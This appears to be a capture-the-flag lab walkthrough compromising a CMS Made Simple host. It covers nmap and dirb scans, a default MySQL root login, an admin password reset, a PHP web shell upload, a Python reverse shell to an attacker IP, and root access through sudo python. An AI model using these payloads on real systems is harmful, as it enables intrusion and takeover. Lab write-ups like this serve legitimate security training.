First enumeration with nmap

`nmap -sC -sV -T4 -oN normal.txt -p 22,80,3306,33060 -Pn 192.168.183.74`

```
# Nmap 7.93 scan initiated Sun May 14 12:24:12 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80,3306,33060 -Pn 192.168.183.74
Nmap scan report for 192.168.183.74
Host is up (0.23s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 27219eb53963e91f2cb26bd33a5f317b (RSA)
|   256 bf908aa5d7e5de89e61a36a193401857 (ECDSA)
|_  256 951f329578085045cd8c7c714ad46c1c (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Home - My CMS
|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
3306/tcp  open  mysql   MySQL 8.0.19
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate
| Not valid before: 2020-03-25T09:30:14
|_Not valid after:  2030-03-23T09:30:14
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.19
|   Thread ID: 44
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ODBCClient, Speaks41ProtocolOld, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsTransactions, InteractiveClient, FoundRows, ConnectWithDatabase, IgnoreSigpipes, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, LongPassword, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 4T\x15\x10\x15M\x03\x01\x0FHk\x01lzH{\x14~f\x0C
|_  Auth Plugin Name: mysql_native_password
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=5/14%Time=6460C4E5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 14 12:24:58 2023 -- 1 IP address (1 host up) scanned in 45.91 seconds
```
now we know what ports and services are running. let the fun begin 😉

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f9dbe600-bd34-43b5-9499-e603e98aa155)

noticed a web server running on port 80, opening it on a browser, got redirected to a web service runinning `cms made simple` cms... let's fuzz for hidden dirs.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/my-cmsms]
└─$ dirb http://192.168.183.74/ 
                                         
-----------------               
DIRB v2.22                                                                         
By The Dark Raver
-----------------

START_TIME: Sun May 14 12:32:27 2023                                               
URL_BASE: http://192.168.183.74/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
                                                                                                                                                                       
-----------------                                                                                                                                                      
                                                                                                                                                                       
GENERATED WORDS: 4612                                                                                                                                                  
                                                                                                                                                                       
---- Scanning URL: http://192.168.183.74/ ----                                                                                                                         
==> DIRECTORY: http://192.168.183.74/admin/                                                                                                                            
==> DIRECTORY: http://192.168.183.74/assets/                                                                                                                           
+ http://192.168.183.74/cgi-bin/ (CODE:403|SIZE:279)                                                                                                                   
==> DIRECTORY: http://192.168.183.74/doc/                                                                                                                              
+ http://192.168.183.74/index.php (CODE:200|SIZE:19502)                                                                                                                
==> DIRECTORY: http://192.168.183.74/lib/                                                                                                                              
==> DIRECTORY: http://192.168.183.74/modules/                                                                                                                          
+ http://192.168.183.74/phpinfo.php (CODE:200|SIZE:90301)                                                                                                              
+ http://192.168.183.74/phpmyadmin (CODE:401|SIZE:461)                                                                                                                 
+ http://192.168.183.74/server-status (CODE:403|SIZE:279)                                                                                                              
==> DIRECTORY: http://192.168.183.74/tmp/                                                                                                                              
==> DIRECTORY: http://192.168.183.74/uploads/                                                                                                                          
```
cool we got some cool dirs, let's check the admin dir.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/248e79d2-7516-43a3-80dc-09e239f205fd)

navigating to the `/admin` dir, got redirected to a login page, tried diff default creds, none worked. let's move to the nuext port `mysql`.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/my-cmsms]
└─$ mysql -h 192.168.183.74 -u root -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 120
Server version: 8.0.19 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
logged in mysql server with default creds `root:root` and boom we got in. let's check what we have in mysql.

```
MySQL [(none)]> use cmsms_db                                                       
Reading table information for completion of table and column names                                                                                                     You can turn off this feature to get a quicker startup with -A
                                                                                                                                                                       Database changed                  
MySQL [cmsms_db]> show tables;                                                                                                                                         +--------------------------------+
| Tables_in_cmsms_db             |                                                                                                                                     +--------------------------------+
| cms_additional_users           |                                                                                                                                     | cms_additional_users_seq       |
| cms_admin_bookmarks            |
***
| cms_userprefs                  |
| cms_users                      |
| cms_users_seq                  |
| cms_version                    |
+--------------------------------+
53 rows in set (0.207 sec)        
                                         
MySQL [cmsms_db]> select * from cms_users;                                         
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                                
| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |                               
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                               
|       1 | admin    | 59f9ba27528694d9b3493dfde7709e70 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |                               
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                               
1 row in set (0.255 sec)          
                                         
MySQL [cmsms_db]>  
```
we got the password of the admin login, let's try to crack the hash.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9425398e-e679-4a00-a5d5-d3fe895b4c7e)

tried cracking the hash, did not work... since we logged in as root, 🤔 why don't we update the password.

```
MySQL [cmsms_db]> update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'password'))) where username = 'admin'
    -> ;
Query OK, 1 row affected (0.221 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [cmsms_db]> 
```
updated the password. let's try login with the newly updated password. `admin:password`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c036b95f-a6ae-4780-883e-7c802863d8c1)

Boom!!! we logged in... Let's get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d31049bd-9619-4c43-9b81-4ec0fee30841)

noticed a file upload function, tried to upload a `.php` file, it failed, so i change it to `.phtml` and boom it worked.

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
content of the `shell.phtml` file... let's check if we got RCE

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d452ec6d-c944-46c3-968f-38dcb82c8cf1)

Boom!!! got RCE... let's pop shell 😉.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ec1c33c7-8b11-4513-8ad2-bb9390352556)

ncat listener ready

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.242",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
Reverse shell payload ready.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/beae3a18-9d6d-4292-9a6a-40558e2ed10e)

send payload, check ncat listener.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/my-cmsms]
└─$ ncat -lnvp 1337           
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.183.74.
Ncat: Connection from 192.168.183.74:37514.
www-data@mycmsms:/var/www/html/uploads/images$
```
checked ncat listener and bull's eye, got a reverse shell.


## Privilege Escalation

```
www-data@mycmsms:/var/www/html/admin$ cat .htpasswd 
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
www-data@mycmsms:/var/www/html/admin$
```
playing around, got an `.htpasswd` file in `/var/www/html/admin/` dir. it contain an encoded text. let's decode this text

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e5434102-fffb-4142-92c2-18408872b33e)

decoded the text and boom got creds `armour:Shield@123`. let's su using this creds.

```
www-data@mycmsms:/home/armour$ su armour
Password: 
armour@mycmsms:~$ sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python
armour@mycmsms:~$
```
switched user to user `armour`, checking for sudo privs, we can run `/usr/bin/python` as root without password. let's abuse it

```
armour@mycmsms:~$ sudo /usr/bin/python
Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty;pty.spawn("/bin/bash")
root@mycmsms:/home/armour# id
uid=0(root) gid=0(root) groups=0(root)
root@mycmsms:/home/armour# 
```
opened python and spawn a tty shell, and Boom we got root.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d5977c2d-b99b-4b1d-b414-faaf8f3a961d)

And we are through 😜 had fun yeah? 




